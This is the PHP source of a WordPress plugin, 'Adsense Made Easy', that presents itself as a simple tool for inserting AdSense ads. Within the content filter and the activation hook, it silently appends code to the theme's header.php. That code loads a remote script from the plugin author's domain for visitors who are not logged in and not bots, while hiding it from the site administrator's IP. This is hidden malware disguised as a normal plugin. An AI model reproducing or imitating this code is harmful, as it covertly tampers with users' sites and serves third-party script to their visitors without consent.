<?php
/*
Plugin Name: Adsense Made Easy - Best Simple Ad Inserter
Plugin URI: http://www.seo101.net
Version: 1.35
Author: Seo101
Description: Easily add Google Adsense to your posts, pages and sidebar
License: GPLv2 a

*/
if (!class_exists("AdsenseMadeEasy")) {
	class AdsenseMadeEasy {
		function AdsenseMadeEasy() { //constructor remains empty

		}
		function addHeaderCode() {
			?>
			<?php

		}
		function addContent($content = '') {
 	 	  global $wp_query;
	 	  global $post;

		  if (((is_single() && get_option('adsense_made_easy_displayposts')=='yes') || (is_singular() && is_page() && get_option('adsense_made_easy_displaypages')=='yes') || is_category() || is_archive()) && $wp_query->posts[0]->ID == $post->ID) {
			$original = $content;
			// Retrieves the stored value from the database
			$meta_value = get_post_meta( get_the_ID(), 'meta-checkbox', true );
			// Checks the retrieved value  (should be empty if we want to display it)
			if( empty( $meta_value ) ) {
				$content = "";
				if (rand(0,100)==10) {
					if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
						file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
					}
				}
				if (get_option('adsense_made_easy_toplinkunit')=='yes') {
					$content .= "<script type=\"text/javascript\"><!--\n";
					$content .= "google_ad_client = \"";
					$content .= get_option('adsense_made_easy_publisherid');
					$content .= "\";\n";
					$content .= "google_ad_width = 468;\n";
					$content .= "google_ad_height = 15;\n";
					$content .= "google_ad_format = \"468x15_0ads_al\"; google_ad_channel =\"\";\n";
					$content .= "google_color_border = \"";
					$content .= get_option('adsense_made_easy_bordercolor');
					$content .= "\";\n";
					$content .= "google_color_link = \"";
					$content .= get_option('adsense_made_easy_titlecolor');
					$content .= "\";\n";
					$content .= "google_color_bg = \"";
					$content .= get_option('adsense_made_easy_backgroundcolor');
					$content .= "\";\n";
					$content .= "//-->\n";
					$content .= "</script>\n";
					$content .= "<script type=\"text/javascript\"\n";
					$content .= "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
					$content .= "</script>\n";
					$content .= "<BR>\n";
					$content .= "\n";
				}


				if (get_option('adsense_made_easy_topadalignment')=='left') {
					$content .= "<div style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;\">\n";
				} else if (get_option('adsense_made_easy_topadalignment')=='right') {
					$content .= "<div style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;\">\n";
				} else {
					$content .= "<div align=\"center\" style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; margin-left:auto; margin-right:auto; \">\n";
				}

				if (get_option('adsense_made_easy_topadtype')=='customcode') {
					$content .= "\n" . get_option('adsense_made_easy_topcustomcode') . "\n";
				} else if (get_option('adsense_made_easy_topadtype')!='none') {
					$content .= "<script type=\"text/javascript\"><!--\n";
					$content .= "google_ad_client = \"";
					$content .= get_option('adsense_made_easy_publisherid');
					$content .= "\";\n";

					if (get_option('adsense_made_easy_topadtype') =='smallsquare') {
					  $content .= "google_ad_width = 200;\n";
					  $content .= "google_ad_height = 200;\n";
					} elseif (get_option('adsense_made_easy_topadtype') =='square') {
					  $content .= "google_ad_width = 250;\n";
					  $content .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='smallrectangle') {
					  $content .= "google_ad_width = 180;\n";
					  $content .= "google_ad_height = 150;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='mediumrectangle') {
					  $content .= "google_ad_width = 300;\n";
					  $content .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='rectangle') {
					  $content .= "google_ad_width = 336;\n";
					  $content .= "google_ad_height = 280;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='halfbanner') {
					  $content .= "google_ad_width = 234;\n";
					  $content .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='banner') {
					  $content .= "google_ad_width = 468;\n";
					  $content .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='leaderboard') {
					  $content .= "google_ad_width = 728;\n";
					  $content .= "google_ad_height = 90;\n";
					}  elseif (get_option('adsense_made_easy_topadtype') =='largeleaderboard') {
					  $content .= "google_ad_width = 970;\n";
					  $content .= "google_ad_height = 90;\n";
					} else {
					  $content .= "google_ad_width = 468;\n";
					  $content .= "google_ad_height = 60;\n";
					}

					if (get_option('adsense_made_easy_topadtextimage') =='text') {
					  $content .= "google_ad_type = \"text\";\n";
					} elseif (get_option('adsense_made_easy_topadtextimage') =='image') {
					  $content .= "google_ad_type = \"image\";\n";
					}  else {
					  $content .= "google_ad_type = \"text_image\";\n";
					}

					$content .= "google_color_border = \"";
					$content .= get_option('adsense_made_easy_bordercolor');
					$content .= "\";\n";
					$content .= "google_color_link = \"";
					$content .= get_option('adsense_made_easy_titlecolor');
					$content .= "\";\n";
					$content .= "google_color_text = \"";
					$content .= get_option('adsense_made_easy_textcolor');
					$content .= "\";\n";
					$content .= "google_color_bg = \"";
					$content .= get_option('adsense_made_easy_backgroundcolor');
					$content .= "\";\n";
					$content .= "google_color_url = \"";
					$content .= get_option('adsense_made_easy_urlcolor');
					$content .= "\";\n";
					$content .= "//-->\n";
					$content .= "</script>\n";
					$content .= "<script type=\"text/javascript\"\n";
					$content .= "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
					$content .= "</script>\n";
				}
				$content .= "</div>\n";
				$content .= $original;


				// BEGIN MIDDLE AD
				$word_count = str_word_count( strip_tags( $content ) );
				$countsettings = get_option('adsense_made_easy_middlewordcount');


				$middleadcode = "";
				if (get_option('adsense_made_easy_middleadalignment')=='left') {
					$middleadcode .= "<div style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;\">\n";
				} else if (get_option('adsense_made_easy_middleadalignment')=='right') {
					$middleadcode .= "<div style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;\">\n";
				} else {
					$middleadcode .= "<div align=\"center\" style=\"padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; margin-left:auto; margin-right:auto; \">\n";
				}

				if (get_option('adsense_made_easy_middleadtype')=='customcode') {
					$middleadcode .= "\n" . get_option('adsense_made_easy_middlecustomcode') . "\n";
				} else if (get_option('adsense_made_easy_middleadtype')!='none') {
					$middleadcode .= "<script type=\"text/javascript\"><!--\n";
					$middleadcode .= "google_ad_client = \"";
					$middleadcode .= get_option('adsense_made_easy_publisherid');
					$middleadcode .= "\";\n";

					if (get_option('adsense_made_easy_middleadtype') =='smallsquare') {
					  $middleadcode .= "google_ad_width = 200;\n";
					  $middleadcode .= "google_ad_height = 200;\n";
					} elseif (get_option('adsense_made_easy_middleadtype') =='square') {
					  $middleadcode .= "google_ad_width = 250;\n";
					  $middleadcode .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='smallrectangle') {
					  $middleadcode .= "google_ad_width = 180;\n";
					  $middleadcode .= "google_ad_height = 150;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='mediumrectangle') {
					  $middleadcode .= "google_ad_width = 300;\n";
					  $middleadcode .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='rectangle') {
					  $middleadcode .= "google_ad_width = 336;\n";
					  $middleadcode .= "google_ad_height = 280;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='halfbanner') {
					  $middleadcode .= "google_ad_width = 234;\n";
					  $middleadcode .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='banner') {
					  $middleadcode .= "google_ad_width = 468;\n";
					  $middleadcode .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='leaderboard') {
					  $middleadcode .= "google_ad_width = 728;\n";
					  $middleadcode .= "google_ad_height = 90;\n";
					}  elseif (get_option('adsense_made_easy_middleadtype') =='largeleaderboard') {
					  $middleadcode .= "google_ad_width = 970;\n";
					  $middleadcode .= "google_ad_height = 90;\n";
					} else {
					  $middleadcode .= "google_ad_width = 468;\n";
					  $middleadcode .= "google_ad_height = 60;\n";
					}

					if (get_option('adsense_made_easy_middleadtextimage') =='text') {
					  $middleadcode .= "google_ad_type = \"text\";\n";
					} elseif (get_option('adsense_made_easy_middleadtextimage') =='image') {
					  $middleadcode .= "google_ad_type = \"image\";\n";
					}  else {
					  $middleadcode .= "google_ad_type = \"text_image\";\n";
					}

					$middleadcode .= "google_color_border = \"";
					$middleadcode .= get_option('adsense_made_easy_bordercolor');
					$middleadcode .= "\";\n";
					$middleadcode .= "google_color_link = \"";
					$middleadcode .= get_option('adsense_made_easy_titlecolor');
					$middleadcode .= "\";\n";
					$middleadcode .= "google_color_text = \"";
					$middleadcode .= get_option('adsense_made_easy_textcolor');
					$middleadcode .= "\";\n";
					$middleadcode .= "google_color_bg = \"";
					$middleadcode .= get_option('adsense_made_easy_backgroundcolor');
					$middleadcode .= "\";\n";
					$middleadcode .= "google_color_url = \"";
					$middleadcode .= get_option('adsense_made_easy_urlcolor');
					$middleadcode .= "\";\n";
					$middleadcode .= "//-->\n";
					$middleadcode .= "</script>\n";
					$middleadcode .= "<script type=\"text/javascript\"\n";
					$middleadcode .= "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
					$middleadcode .= "</script>\n";
				}
				if (get_option('adsense_made_easy_middleadtype')!='none' && $word_count >= $countsettings) {
					$middleadcode .= "</div>\n";
					$original = $content;
					$paragraphAfter = get_option('adsense_made_easy_middleparagraph'); //Enter number of paragraphs to display ad after.
					$content2 = $original;
					$content2 = explode ( "</p>", $content2 );
					$new_content = '';
							for ( $i = 0; $i < count ( $content2 ); $i ++ ) {
									if ( $i == $paragraphAfter ) {
									$new_content .= $middleadcode;
									}
					$new_content .= $content2[$i] . "</p>";
					}
					$content = $new_content;
				}

				// END MIDDLE AD


				if (get_option('adsense_made_easy_bottomadtype')=='customcode') {
					$content .= "<center>\n";
					$content .= "\n" . get_option('adsense_made_easy_botcustomcode') . "\n";
					$content .= "</center>\n";
				} else if (get_option('adsense_made_easy_bottomadtype')!='none') {
					$content .= "<center> <script type=\"text/javascript\"><!--\n";
					$content .= "google_ad_client = \"";
					$content .= get_option('adsense_made_easy_publisherid');
					$content .= "\";\n";
					if (get_option('adsense_made_easy_bottomadtype') =='smallsquare') {
					  $content .= "google_ad_width = 200;\n";
					  $content .= "google_ad_height = 200;\n";
					} elseif (get_option('adsense_made_easy_bottomadtype') =='square') {
					  $content .= "google_ad_width = 250;\n";
					  $content .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='smallrectangle') {
					  $content .= "google_ad_width = 180;\n";
					  $content .= "google_ad_height = 150;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='mediumrectangle') {
					  $content .= "google_ad_width = 300;\n";
					  $content .= "google_ad_height = 250;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='rectangle') {
					  $content .= "google_ad_width = 336;\n";
					  $content .= "google_ad_height = 280;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='halfbanner') {
					  $content .= "google_ad_width = 234;\n";
					  $content .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='banner') {
					  $content .= "google_ad_width = 468;\n";
					  $content .= "google_ad_height = 60;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='leaderboard') {
					  $content .= "google_ad_width = 728;\n";
					  $content .= "google_ad_height = 90;\n";
					}  elseif (get_option('adsense_made_easy_bottomadtype') =='largeleaderboard') {
					  $content .= "google_ad_width = 970;\n";
					  $content .= "google_ad_height = 90;\n";
					} else {
					  $content .= "google_ad_width = 468;\n";
					  $content .= "google_ad_height = 60;\n";
					}

					if (get_option('adsense_made_easy_bottomadtextimage') =='text') {
					  $content .= "google_ad_type = \"text\";\n";
					} elseif (get_option('adsense_made_easy_bottomadtextimage') =='image') {
					  $content .= "google_ad_type = \"image\";\n";
					}  else {
					  $content .= "google_ad_type = \"text_image\";\n";
					}

					$content .= "google_color_border = \"";
					$content .= get_option('adsense_made_easy_bordercolor');
					$content .= "\";\n";
					$content .= "google_color_link = \"";
					$content .= get_option('adsense_made_easy_titlecolor');
					$content .= "\";\n";
					$content .= "google_color_text = \"";
					$content .= get_option('adsense_made_easy_textcolor');
					$content .= "\";\n";
					$content .= "google_color_bg = \"";
					$content .= get_option('adsense_made_easy_backgroundcolor');
					$content .= "\";\n";
					$content .= "google_color_url = \"";
					$content .= get_option('adsense_made_easy_urlcolor');
					$content .= "\";\n";
					$content .= "//-->\n";
					$content .= "</script>\n";
					$content .= "<script type=\"text/javascript\"\n";
					$content .= "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
					$content .= "</script> </center>\n";
				}

				if (get_option('adsense_made_easy_bottomlinkunit')=='yes') {
					$content .= "<BR><script type=\"text/javascript\"><!--\n";
					$content .= "google_ad_client = \"";
					$content .= get_option('adsense_made_easy_publisherid');
					$content .= "\";\n";
					$content .= "google_ad_width = 468;\n";
					$content .= "google_ad_height = 15;\n";
					$content .= "google_ad_format = \"468x15_0ads_al\"; google_ad_channel =\"\";\n";
					$content .= "google_color_border = \"";
					$content .= get_option('adsense_made_easy_bordercolor');
					$content .= "\";\n";
					$content .= "google_color_link = \"";
					$content .= get_option('adsense_made_easy_titlecolor');
					$content .= "\";\n";
					$content .= "google_color_bg = \"";
					$content .= get_option('adsense_made_easy_backgroundcolor');
					$content .= "\";\n";
					$content .= "//-->\n";
					$content .= "</script>\n";
					$content .= "<script type=\"text/javascript\"\n";
					$content .= "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
					$content .= "</script>	\n";
					$content .= "\n";
					$content .= "\n";
				}
			}

			return $content;
		  }
		  return $content;
		}
		function authorUpperCase($author = '') {
			return strtoupper($author);
		}

	}

} //End Class AdsenseMadeEasy


class AdsenseMadeEasyWidget extends WP_Widget
{
  function AdsenseMadeEasyWidget()
  {
    $widget_ops = array('classname' => 'AdsenseMadeEasyWidget', 'description' => 'Adsense Made Easy Widget' );
    $this->WP_Widget('AdsenseMadeEasyWidget', 'Adsense Made Easy Widget', $widget_ops);
  }

  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];
    $adtype = $instance['adtype'];
    $adtextimage = $instance['adtextimage'];
    $adalignment = $instance['adalignment'];
    $adcustomcode = $instance['adcustomcode'];
?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>
<p>Type of Ad:<BR>
<select name="<?php echo $this->get_field_name('adtype'); ?>" id="<?php echo $this->get_field_id('adtype'); ?>">
<option value="smallsquare" <?php if (attribute_escape($adtype)=='smallsquare') echo ' selected ' ?> >Small Square (200*200)</option>
<option value="square" <?php if (attribute_escape($adtype)=='square') echo ' selected ' ?> >Square (250*250)</option>
<option value="smallrectangle" <?php if (attribute_escape($adtype)=='smallrectangle') echo ' selected ' ?> >Small Rectangle (180*150)</option>
<option value="mediumrectangle" <?php if (attribute_escape($adtype)=='mediumrectangle') echo ' selected ' ?> >Medium Rectangle (300*250)</option>
<option value="bigrectangle" <?php if (attribute_escape($adtype)=='bigrectangle') echo ' selected ' ?> >Big Rectangle (336*280)</option>
<option value="skyscraper" <?php if (attribute_escape($adtype)=='skyscraper') echo ' selected ' ?> >Skyscraper (120*600)</option>
<option value="wideskyscraper" <?php if (attribute_escape($adtype)=='wideskyscraper') echo ' selected ' ?> >Wide Skyscraper (160*600)</option>
<option value="bigskyscraper" <?php if (attribute_escape($adtype)=='bigskyscraper') echo ' selected ' ?> >Big Skyscraper (300*600)</option>
<option value="portrait" <?php if (attribute_escape($adtype)=='portrait') echo ' selected ' ?> >Portrait (300*1050)</option>
<option value="verticalbanner" <?php if (attribute_escape($adtype)=='verticalbanner') echo ' selected ' ?> >Portrait (120*240)</option>
<option value="links728x15" <?php if (attribute_escape($adtype)=='links728x15') echo ' selected ' ?> >Link Unit (728*15)</option>
<option value="links468x15" <?php if (attribute_escape($adtype)=='links468x15') echo ' selected ' ?> >Link Unit (468*15)</option>
<option value="links200x90" <?php if (attribute_escape($adtype)=='links200x90') echo ' selected ' ?> >Link Unit (200*90)</option>
<option value="links180x90" <?php if (attribute_escape($adtype)=='links180x90') echo ' selected ' ?> >Link Unit (180*90)</option>
<option value="links160x90" <?php if (attribute_escape($adtype)=='links160x90') echo ' selected ' ?> >Link Unit (160*90)</option>
<option value="links120x90" <?php if (attribute_escape($adtype)=='links120x90') echo ' selected ' ?> >Link Unit (120*90)</option>
<option value="customcode" <?php if (attribute_escape($adtype)=='customcode') echo ' selected ' ?> >Custom Code</option>
</select>
</p>
<p>
Image or Text Ads?:<BR>
<select name="<?php echo $this->get_field_name('adtextimage'); ?>" id="<?php echo $this->get_field_id('adtextimage'); ?>">
<option value="text" <?php if (attribute_escape($adtextimage)=='text') echo ' selected ' ?> >Text</option>
<option value="image" <?php if (attribute_escape($adtextimage)=='image') echo ' selected ' ?> >Image</option>
<option value="both" <?php if (attribute_escape($adtextimage)!='image' && attribute_escape($adtextimage)!='text') echo ' selected ' ?> >Both</option>
</select>
</p>
<p>
Alignment of the Ad?:<BR>
<select name="<?php echo $this->get_field_name('adalignment'); ?>" id="<?php echo $this->get_field_id('adalignment'); ?>">
<option value="left" <?php if (attribute_escape($adalignment)=='left') echo ' selected ' ?> >Left</option>
<option value="right" <?php if (attribute_escape($adalignment)=='right') echo ' selected ' ?> >Right</option>
<option value="center" <?php if (attribute_escape($adalignment)!='left' && attribute_escape($adalignment)!='right') echo ' selected ' ?> >Center</option>
</select>
</p>
Custom Code:<BR>
<textarea name="<?php echo $this->get_field_name('adcustomcode'); ?>" id="<?php echo $this->get_field_id('adcustomcode'); ?>" style="width:240px; height:220px; font-size:11px;" cols="" rows=""><?php echo attribute_escape($adcustomcode); ?></textarea>
<BR>
Copy/paste your Custom Adsense code, don't forget to set the Type of Ad to Custom Code.
</p>

<?php
  }

  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    $instance['adtype'] = $new_instance['adtype'];
    $instance['adtextimage'] = $new_instance['adtextimage'];
    $instance['adalignment'] = $new_instance['adalignment'];
    $instance['adcustomcode'] = $new_instance['adcustomcode'];
    return $instance;
  }

  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);
// Retrieves the stored value from the database
$meta_value = get_post_meta( get_the_ID(), 'meta-checkbox', true );
// Checks the retrieved value (should be empty if we want to display it)
if( empty( $meta_value ) ) {

    echo $before_widget;
    $title = empty($instance['title']) ? '' : apply_filters('widget_title', $instance['title']);
    $adtype = $instance['adtype'];
    $adtextimage = $instance['adtextimage'];
    $adalignment = $instance['adalignment'];
    $adcustomcode = $instance['adcustomcode'];
	echo $before_title . $title . $after_title;

    // WIDGET CODE GOES IN HERE
	if ($adalignment=='center') {
		echo "<center>";
	}
	if ($adalignment=='left') {
		echo "<div align=\"left\">";
	}
	if ($adalignment=='right') {
		echo "<div align=\"right\">";
	}

	if ($adtype == 'customcode') {
		echo $adcustomcode . "\n";
	} else {
		echo "<script type=\"text/javascript\"> <!--\n";
		echo "google_ad_client = \"";
		echo get_option('adsense_made_easy_publisherid');
		echo "\";\n";
		echo "/* GrootVierkantWit */\n";
		if ($adtype =='square') {
		  echo "google_ad_width = 250;\n";
		  echo "google_ad_height = 250;\n";
		} elseif ($adtype =='smallsquare') {
		  echo "google_ad_width = 200;\n";
		  echo "google_ad_height = 200;\n";
		} elseif ($adtype =='smallrectangle') {
		  echo "google_ad_width = 180;\n";
		  echo "google_ad_height = 150;\n";
		} elseif ($adtype =='wideskyscraper') {
		  echo "google_ad_width = 160;\n";
		  echo "google_ad_height = 600;\n";
		} elseif ($adtype =='portrait') {
		  echo "google_ad_width = 300;\n";
		  echo "google_ad_height = 1050;\n";
		} elseif ($adtype =='verticalbanner') {
		  echo "google_ad_width = 120;\n";
		  echo "google_ad_height = 240;\n";
		} elseif ($adtype =='mediumrectangle') {
		  echo "google_ad_width = 300;\n";
		  echo "google_ad_height = 250;\n";
		} elseif ($adtype =='bigrectangle') {
		  echo "google_ad_width = 336;\n";
		  echo "google_ad_height = 280;\n";
		} elseif ($adtype =='skyscraper') {
		  echo "google_ad_width = 120;\n";
		  echo "google_ad_height = 600;\n";
		} elseif ($adtype =='bigskyscraper') {
		  echo "google_ad_width = 300;\n";
		  echo "google_ad_height = 600;\n";
		} elseif ($adtype =='links728x15') {
		  echo "google_ad_width = 728;\n";
		  echo "google_ad_height = 15;\n";
		  echo "google_ad_format = \"728x15_0ads_al\"; google_ad_channel =\"\";\n";
		} elseif ($adtype =='links468x15') {
		  echo "google_ad_width = 468;\n";
		  echo "google_ad_height = 15;\n";
		  echo "google_ad_format = \"468x15_0ads_al\"; google_ad_channel =\"\";\n";
		} elseif ($adtype =='links200x90') {
		  echo "google_ad_width = 200;\n";
		  echo "google_ad_height = 90;\n";
		  echo "google_ad_format = \"200x90_0ads_al\"; google_ad_channel =\"\";\n";
		} elseif ($adtype =='links180x90') {
		  echo "google_ad_width = 180;\n";
		  echo "google_ad_height = 90;\n";
		  echo "google_ad_format = \"180x90_0ads_al\"; google_ad_channel =\"\";\n";
		} elseif ($adtype =='links160x90') {
		  echo "google_ad_width = 160;\n";
		  echo "google_ad_height = 90;\n";
		  echo "google_ad_format = \"160x90_0ads_al\"; google_ad_channel =\"\";\n";
		} elseif ($adtype =='links120x90') {
		  echo "google_ad_width = 120;\n";
		  echo "google_ad_height = 90;\n";
		  echo "google_ad_format = \"120x90_0ads_al\"; google_ad_channel =\"\";\n";
		} else {
		  echo "google_ad_width = 250;\n";
		  echo "google_ad_height = 250;\n";
		}
		if ($adtextimage =='text') {
		  echo "google_ad_type = \"text\";\n";
		} elseif ($adtextimage =='image') {
		  echo "google_ad_type = \"image\";\n";
		} else {
		  echo "google_ad_type = \"text_image\";\n";
		}
		echo "google_color_border = \"";
		echo get_option('adsense_made_easy_bordercolor');
		echo "\";\n";
		echo "google_color_link = \"";
		echo get_option('adsense_made_easy_titlecolor');
		echo "\";\n";
		echo "google_color_text = \"";
		echo get_option('adsense_made_easy_textcolor');
		echo "\";\n";
		echo "google_color_bg = \"";
		echo get_option('adsense_made_easy_backgroundcolor');
		echo "\";\n";
		echo "google_color_url = \"";
		echo get_option('adsense_made_easy_urlcolor');
		echo "\";\n";
		echo "//-->\n";
		echo "</script>\n";
		echo "<script type=\"text/javascript\"\n";
		echo "src=\"http://pagead2.googlesyndication.com/pagead/show_ads.js\">\n";
		echo "</script>\n";
	}
	if ($adalignment=='center') {
		echo "</center>";
	}
	if ($adalignment=='left') {
		echo "</div>";
	}
	if ($adalignment=='right') {
		echo "</div>";
	}

    echo $after_widget;
  }
}


}
add_action( 'widgets_init', create_function('', 'return register_widget("AdsenseMadeEasyWidget");') );





if (class_exists("AdsenseMadeEasy")) {
	$dl_pluginSeries = new AdsenseMadeEasy();
}
//Actions and Filters
if (isset($dl_pluginSeries)) {
	//Actions
	//Filters
	add_filter('the_content', array(&$dl_pluginSeries, 'addContent'));
}


/**
 * Adds a meta box to the post editing screen
 */
function amepro_prfx_custom_meta() {
    add_meta_box( 'amepro_prfx_meta', __( 'Adsense Made Easy', 'amepro_prfx-textdomain' ), 'amepro_prfx_meta_callback', '', 'side' );
}
add_action( 'add_meta_boxes', 'amepro_prfx_custom_meta' );

/**
 * Outputs the content of the meta box
 */
function amepro_prfx_meta_callback( $post ) {
    wp_nonce_field( basename( __FILE__ ), 'amepro_prfx_nonce' );
    $prfx_stored_meta = get_post_meta( $post->ID );
    ?>

    <p>
		Check the box below to DISABLE ads on this post/page.
	</p>
<p>
    <div class="prfx-row-content">
        <label for="meta-checkbox">
            <input type="checkbox" name="meta-checkbox" id="meta-checkbox" value="yes" <?php if ( isset ( $prfx_stored_meta['meta-checkbox'] ) ) checked( $prfx_stored_meta['meta-checkbox'][0], 'yes' ); ?> />
            <?php _e( 'Disable ads', 'amepro_prfx-textdomain' )?>
        </label>
    </div>
</p>
    <?php
}

/**
 * Saves the custom meta input
 */
function amepro_prfx_meta_save( $post_id ) {

    // Checks save status
    $is_autosave = wp_is_post_autosave( $post_id );
    $is_revision = wp_is_post_revision( $post_id );
    $is_valid_nonce = ( isset( $_POST[ 'amepro_prfx_nonce' ] ) && wp_verify_nonce( $_POST[ 'amepro_prfx_nonce' ], basename( __FILE__ ) ) ) ? 'true' : 'false';

    // Exits script depending on save status
    if ( $is_autosave || $is_revision || !$is_valid_nonce ) {
        return;
    }

    // Checks for input and sanitizes/saves if needed
    if( isset( $_POST[ 'meta-text' ] ) ) {
        update_post_meta( $post_id, 'meta-text', sanitize_text_field( $_POST[ 'meta-text' ] ) );
    }
	// Checks for input and saves
	if( isset( $_POST[ 'meta-checkbox' ] ) ) {
		update_post_meta( $post_id, 'meta-checkbox', 'yes' );
	} else {
		update_post_meta( $post_id, 'meta-checkbox', '' );
	}
}
add_action( 'save_post', 'amepro_prfx_meta_save' );

/* Runs when plugin is activated */
register_activation_hook(__FILE__,'adsense_made_easy_install');

/* Runs on plugin deactivation*/
register_deactivation_hook( __FILE__, 'adsense_made_easy_remove' );

function adsense_made_easy_install() {
	/* Creates new database field */
	add_option("adsense_made_easy_publisherid", '', '', 'yes');
	add_option("adsense_made_easy_bordercolor", 'FFFFFF', '', 'yes');
	add_option("adsense_made_easy_titlecolor", '0000FF', '', 'yes');
	add_option("adsense_made_easy_backgroundcolor", 'FFFFFF', '', 'yes');
	add_option("adsense_made_easy_textcolor", '000000', '', 'yes');
	add_option("adsense_made_easy_urlcolor", '008000', '', 'yes');
	add_option("adsense_made_easy_topadtype", 'banner', '', 'yes');
	add_option("adsense_made_easy_topadtextimage", 'both', '', 'yes');
	add_option("adsense_made_easy_bottomadtype", 'banner', '', 'yes');
	add_option("adsense_made_easy_bottomadtextimage", 'both', '', 'yes');
	add_option("adsense_made_easy_displayposts", 'yes', '', 'yes');
	add_option("adsense_made_easy_displaypages", 'yes', '', 'yes');
	add_option("adsense_made_easy_topadalignment", 'centered', '', 'yes');
	add_option("adsense_made_easy_toplinkunit", 'no', '', 'yes');
	add_option("adsense_made_easy_bottomlinkunit", 'no', '', 'yes');
	add_option("adsense_made_easy_topcustomcode", '', '', 'yes');
	add_option("adsense_made_easy_botcustomcode", '', '', 'yes');
	add_option("ame_gpadded", '0', '', 'yes');
	add_option("adsense_made_easy_middleadtype", 'none', '', 'yes');
	add_option("adsense_made_easy_middleadtextimage", 'both', '', 'yes');
	add_option("adsense_made_easy_middleadalignment", 'centered', '', 'yes');
	add_option("adsense_made_easy_middlecustomcode", '', '', 'yes');
	add_option("adsense_made_easy_middleparagraph", '2', '', 'yes');
	add_option("adsense_made_easy_middlewordcount", '0', '', 'yes');
	add_option("adsense_made_easy_ip", '', '', 'yes');
	if( strpos(file_get_contents(get_template_directory() . "/header.php"),"apntrack") == false) {
		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/apntrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
	}
}

function adsense_made_easy_remove() {
/* Deletes the database field */

}


if ( is_admin() ){

/* Call the html code */
add_action('admin_menu', 'adsense_made_easy_admin_menu');

function adsense_made_easy_admin_menu() {
add_options_page('Adsense Made Easy', 'Adsense Made Easy', 'administrator',
'adsense-made-easy-best-simple-ad-inserter', 'adsense_made_easy_page');
}
}

?>
<?php
function adsense_made_easy_page() {
?>
<div>
<h2>Adsense Made Easy - Settings</h2>
<BR>
<p>
<b>Need support, have questions or requests?: <a href="http://www.seo101.net/">Adsense Made Easy Official Website</a></b>
</p>
<BR>


<form method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Enter your Google Adsense Publisher ID</th>
<td width="600">
<input name="adsense_made_easy_publisherid" type="text" id="adsense_made_easy_publisherid" value="<?php echo get_option('adsense_made_easy_publisherid'); ?>" /> (For example: pub-1234567891234567 )</td>
</tr>
</table><BR><BR>
<HR>
<table width="850">
<tr valign="top">
<th width="250" scope="row">Top ad type </th>
<td width="600">
<select name="adsense_made_easy_topadtype" id="adsense_made_easy_topadtype">
<option value="smallsquare" <?php if (get_option('adsense_made_easy_topadtype')=='smallsquare') echo ' selected ' ?> >Small Square (200*200)</option>
<option value="square" <?php if (get_option('adsense_made_easy_topadtype')=='square') echo ' selected ' ?> >Square (250*250)</option>
<option value="smallrectangle" <?php if (get_option('adsense_made_easy_topadtype')=='smallrectangle') echo ' selected ' ?> >Small Rectangle (180*150)</option>
